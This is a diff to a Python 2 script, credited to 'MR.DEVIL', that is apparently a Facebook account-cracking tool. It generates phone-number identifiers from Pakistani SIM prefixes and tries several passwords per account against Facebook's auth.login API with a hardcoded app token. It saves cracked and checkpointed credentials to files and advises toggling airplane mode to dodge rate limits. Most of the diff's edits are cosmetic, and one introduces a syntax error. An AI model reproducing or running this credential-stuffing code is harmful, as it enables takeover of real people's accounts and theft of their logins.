@@ -6,7 +6,7 @@
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 __author__ = 'MR.DEVIL'
 __copyright = 'All rights reserved . Copyright  MR.DEVIL'
-CorrectUsername = 'DARK HACKER'
+CorrectUsername = 'D4RKH4CK3R'
 os.system('clear')
 loop = 'true'
 while (loop == 'true'):
@@ -92,18 +92,18 @@ def tik():
 
 ##### LOGO #####
 logo = """ 
-          ░░░    ░░░ ░░░░░░  ░░░░░░  
-         ▒▒▒▒  ▒▒▒▒   ▒▒   ▒▒     ▒▒   ▒▒ 
-         ▒▒ ▒▒▒▒ ▒▒   ▒▒▒▒▒▒ ▒▒   ▒▒ 
-         ▓▓      ▓▓     ▓▓ ▓▓        ▓▓ ▓▓   ▓▓ 
-         ██      ██     ██ ██        ██ ████        
-                   WELCOME to  DEVIL'S world     
-         Mr.devil professional Hacking tool maker                                                                        
+   ░░░    ░░░ ░░░░░░  ░░░░░░  
+   ▒▒▒▒  ▒▒▒▒ ▒▒   ▒▒ ▒▒   ▒▒ 
+   ▒▒ ▒▒▒▒ ▒▒ ▒▒▒▒▒▒  ▒▒   ▒▒ 
+   ▓▓  ▓▓   ▓▓ ▓▓  ▓▓  ▓▓   ▓▓ 
+   ██        ██ ██   ██ ██████  
+  《WELCOME to DEVIL'S world▪▪▪▪▪》
+   Mr.devil professional Hacking tool maker                                                                        
  ​______________________________________________
- ​AUTHOR    :          MR.DEVIL 
- TOOL nm   :          MRD version 2.0.1
- ​MR DEVIL  :          PROGRAMMER & DARK HACKER 
- ​MR DEVIL  :          LORD OF DARK WORLD 
+ ​AUTHOR   :MR.DEVIL 
+  TOOL nm  :MRD version 2.0.1
+ ​MR DEVIL :PROGRAMMER & DARK HACKER 
+ ​MR DEVIL :LORD OF DARK WORLD 
  ​______________________________________________
  ​                                                 """ 
 logo1 = '   \n\n\x1b[4;96mSELECT PAK  SIM CODE \x1b[1;0m\n\x1b[1;96m[1] Jazz    \x1b[1;97m 00,01,02,03,04,05,06,07,08\n\x1b[1;96m[2] Zong    \x1b[1;97m 11,12,13,14,15,16,17\n\x1b[1;96m[3] Warid   \x1b[1;97m 21,22,23,24,25\n\x1b[1;96m[4] Ufone   \x1b[1;97m 30,31,32,33,34,35\n\x1b[1;96m[5] Telenor \x1b[1;97m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
@@ -158,9 +158,9 @@ def action():
         action()
     os.system('clear')
     print logo
-    jalan ('\x1b[1;97mUse Mobil data and every 5 minutes  later. Use airplane mode  for 10 sec.')
+    jalan ('\x1b[1;97mUse airplane mode for 5sec after every 10 mint')
     print(47*'-')
-    xxx = str(len(id))
+    xxx = str(len(id)
     jalan('\x1b[1;97m              TOTAL IDS :\x1b[1;95m ' + xxx)
     print(47*'-')
     def main(arg):
@@ -174,13 +174,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[92m  [MRD_OK]  ' + k + c + user + '  |  ' + pass1
-                okb = open('save/CP.txt', 'a')
+                print '\x1b[92m  [MRD-OK]  ' + k + c + user + '  |  ' + pass1
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m  [MRD _CP] ' + k + c + user + '  |  ' + pass1
+                print '\x1b[1;91m  [MRD-CP] ' + k + c + user + '  |  ' + pass1
                 cps = open('save/CP.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
@@ -190,13 +190,13 @@ def action():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m  [MRD_OK] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;92m  [MRD-OK] ' + k + c + user + '  |  ' + pass2
                     okb = open('save/OK.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;92m  [MRD_CP] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;92m   [MRD-OK] ' + k + c + user + '  |  ' + pass2
                     cps = open('save/CP.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
@@ -206,13 +206,13 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m  [MRD_OK]  ' + k + c + user + '  |  ' + pass3
+                        print '\x1b[1;92m  [MRD-OK]  ' + k + c + user + '  |  ' + pass3
                         okb = open('save/OK.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;92m  [MRD_CP] ' + k + c + user + '  |  ' + pass3
+                        print '\x1b[1;92m  [MRD-OK] ' + k + c + user + '  |  ' + pass3
                         cps = open('save/CP.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
